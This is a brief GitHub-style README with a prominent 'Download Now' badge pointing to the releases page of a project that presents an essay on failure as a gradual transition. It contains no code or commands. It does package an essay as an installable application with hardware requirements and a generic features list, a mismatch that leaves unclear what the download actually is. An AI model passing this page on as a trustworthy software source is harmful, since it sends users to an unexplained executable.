[![Download the latest release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/pitu64/Failure-is-a-Transition/releases)

## 📖 Description
Failure is often seen as a clear endpoint. This application takes a different view. It presents failure as a gradual transition caused by various factors, such as pressure buildup and hidden instabilities. It dives into the reasons why traditional prediction models fall short in preventing failures, especially in systems centered around human behavior.  

More than just an essay, it encourages readers to rethink failure, applying a systems-thinking approach to understanding complex behaviors and outcomes.

## 🔑 Features
- **Systems Thinking:** Understand complexity in human-centered systems.
- **Failure Analysis:** Gain insights into why and how failures happen.
- **Decision Support:** Make better choices by recognizing early warning signs.
- **Equilibrium Modeling:** Analyze stability and its critical role in systems.
- **Ethical and Explainable AI:** Explore the balance between technology and human values.

## 🖥️ System Requirements
- **Operating System:** Windows, macOS, or Linux
- **Memory:** Minimum of 4 GB RAM
- **Storage:** At least 100 MB of available space
- **Processor:** 1 GHz or faster dual-core processor
